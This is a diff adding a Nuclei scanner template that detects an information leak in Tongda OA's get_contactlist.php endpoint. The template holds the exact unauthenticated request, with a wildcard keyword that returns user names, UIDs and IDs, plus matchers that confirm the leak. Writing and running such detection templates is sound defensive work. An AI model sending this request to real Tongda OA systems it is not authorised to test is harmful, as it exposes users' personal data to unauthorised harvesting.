@@ -1,0 +1,26 @@
+id: tongda-oa-get-contactlist-info-leak
+info:
+  name: Tongda OA get_contactlist.php Sensitive Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3f"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"user_name\":"
+          - "\"user_uid\":"
+          - "\"user_id\":"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
